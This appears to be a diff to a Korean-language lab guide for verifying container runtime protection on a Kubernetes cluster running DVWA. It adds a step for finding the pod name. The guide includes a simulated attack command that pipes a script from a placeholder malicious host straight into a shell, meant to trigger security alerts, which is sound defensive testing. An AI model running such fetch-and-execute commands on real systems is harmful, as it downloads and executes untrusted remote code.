@@ -211,12 +211,24 @@ kubectl get pods -A | grep azure
 ### Step 4. Runtime protection 기능 검증
 **목표:** 실행 중인 컨테이너 보호 기능 확인
 
-### 작업
-```bash
-# DVWA pod 진입
-kubectl exec -it <dvwa-pod-name> -- /bin/bash
+* Pod name
+kubectl get pods
 
-# suspicious process 실행 예시
+> 출력예시
+> ```bash
+> NAME                     READY   STATUS    RESTARTS   AGE
+> dvwa-5f8d94d75f-abcde    1/1     Running   0          10m
+> ```
+>  `dvwa-5f8d94d75f-abcde` ➔ 이게 pod name
+
+
+* DVWA pod 진입
+```bash
+kubectl exec -it <dvwa-pod-name> -- /bin/bash
+```
+
+* suspicious process 실행 예시
+```bash
 curl http://malicious-site.com/malware.sh | sh
 ```
 
